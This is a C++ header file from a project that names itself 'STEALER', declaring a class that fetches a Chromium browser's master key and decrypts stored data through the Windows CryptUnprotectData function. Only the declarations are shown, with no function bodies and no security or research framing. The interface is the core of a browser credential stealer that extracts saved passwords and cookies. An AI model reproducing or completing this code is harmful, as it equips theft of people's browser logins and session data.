//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CHROMUIMUTIL_H
#define STEALER_CHROMUIMUTIL_H

#include "../../Includes.h"
#include "json.hpp"

using json = nlohmann::json;

class ChromuimUtil {
public:
    static std::vector<BYTE> getMasterKey(fs::path &path);
    static std::string decryptData(const std::vector<BYTE> &buffer, const std::vector<BYTE> &master_Key);
private:
    static std::vector<BYTE> CryptUnprotectDataWrapper(const std::vector<BYTE> &data);
};


#endif //STEALER_CHROMUIMUTIL_H
